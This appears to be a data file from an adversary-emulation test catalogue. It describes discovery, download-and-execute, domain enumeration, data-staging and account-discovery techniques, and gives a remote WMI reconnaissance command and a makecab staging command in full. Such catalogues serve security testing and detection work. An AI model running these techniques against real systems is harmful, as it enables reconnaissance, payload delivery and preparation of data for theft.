attacks.expected_behavior: Generates CSV/text files in %TEMP% with operating system metadata, service configurations, process listings, and disk capacity information

attacks.description: Collects system information such as kernel version and hostname
attacks.expected_behavior: Displays system information including kernel version, hostname, and operating system

attacks.description: Collects operating system release information
attacks.expected_behavior: Displays operating system release information including name, version, and ID

attacks.description: Collects network configuration information
attacks.expected_behavior: Displays network interface configuration including IP addresses and subnet masks

attacks.description: Basic file download using certutil legacy binary
attacks.expected_behavior: Downloads test.txt from example.com to %TEMP% using certutil's built-in download capability.

attacks.description: Intermediate PowerShell downloader
attacks.expected_behavior: Downloads test.txt using PowerShell's Invoke-WebRequest and saves to %TEMP%.

attacks.description: Advanced encoded PowerShell download + execute
attacks.expected_behavior: Base64-encoded PowerShell that downloads test.txt and attempts to execute it. Uses benign example.com payload.

attacks.description: Enumerates all computers and network resources visible in the current domain or workgroup using legacy net.exe binary.
attacks.expected_behavior: Lists available shared resources and computers on the network. May return access denied for some systems if not in a domain environment.

attacks.description: Queries domain controller list for a specified domain using nltest.exe, a Windows domain enumeration tool.
attacks.expected_behavior: Returns a list of domain controllers for the domain 'example.local'. Will fail silently if not on a domain or if the domain does not exist.

attacks.command: powershell -Command "Get-WmiObject -Class Win32_Service -ComputerName 'DC01.example.local' -ErrorAction SilentlyContinue | Select-Object Name, State, StartMode"
attacks.description: Uses PowerShell WMI to remotely query running services on a target domain controller, simulating lateral movement reconnaissance.
attacks.expected_behavior: Retrieves a list of services (name, state, startup mode) from the remote system DC01.example.local. Fails if WMI access is denied or the host is unreachable.

attacks.description: Displays all listening sockets, including TCP and UDP, along with the program name and PID of the service using the socket.
attacks.expected_behavior: Lists all listening network services, including their protocols and the processes associated with them.

attacks.description: Similar to netstat, but uses the `ss` command to display listening sockets, including TCP, and shows the process ID and name of the program to which each socket belongs.
attacks.expected_behavior: Displays detailed information about listening TCP sockets, including the process IDs and names.

attacks.description: Uses `nmap` to perform a TCP connect scan on the local machine, which can help discover open network services.
attacks.expected_behavior: Scans the local machine for open TCP ports, indicating which network services are listening and potentially accessible.

attacks.description: Compress a single collected file into a ZIP archive using PowerShell's Compress-Archive cmdlet.
attacks.expected_behavior: Creates archive.zip in the %TEMP% folder containing testdata.txt; no output is displayed unless an error occurs.

attacks.description: Archive multiple log files matching a wildcard pattern into a ZIP file using the built‑in tar utility.
attacks.expected_behavior: Produces logs_archive.zip in %TEMP% containing all files that match log_*.txt; tar exits with status 0 on success.

attacks.command: (echo .OPTION Explicit & echo .Set CabinetNameTemplate=%TEMP%\\data.cab & echo .Set CompressionType=MSZIP & echo "%TEMP%\\data1.bin" "%TEMP%\\data2.bin") > "%TEMP%\\cab.txt" && makecab /F "%TEMP%\\cab.txt"
attacks.description: Create a cabinet archive (.cab) from two binary files using makecab.exe and a temporary response file.
attacks.expected_behavior: Generates data.cab in %TEMP% containing data1.bin and data2.bin; the response file cab.txt is removed automatically on next run or left harmless.

attacks.description: Archive the /etc/passwd file using tar and gzip, demonstrating basic archiving capability.
attacks.expected_behavior: Creates an archive named archive.tar.gz in /tmp containing /etc/passwd.

attacks.description: Find all .txt files in /home and append them to an archive named archive.tar in /tmp, showing an intermediate level of complexity by using find and tar together.
attacks.expected_behavior: Appends found .txt files to archive.tar in /tmp.

attacks.description: Create an advanced archive containing log files from /var/log and /etc/hosts, demonstrating the ability to archive multiple file types and locations.
attacks.expected_behavior: Creates an archive named advanced_archive.tar.gz in /tmp containing log files and /etc/hosts.

attacks.description: Basic account discovery by reading the /etc/passwd file to list all user accounts.
attacks.expected_behavior: Outputs the contents of /etc/passwd, showing all user accounts, UIDs, GIDs, home directories, and login shells.

attacks.description: Intermediate account discovery using getent to retrieve user account entries from the system's user database.
attacks.expected_behavior: Lists all user accounts known to the system, including local and directory service accounts, in the same format as /etc/passwd.

attacks.description: Advanced account discovery using awk to filter and display only non-system user accounts (typically UID >= 1000) with username, UID, and home directory.
attacks.expected_behavior: Prints a filtered list of normal user accounts, excluding system accounts, showing username, UID, and home directory path.
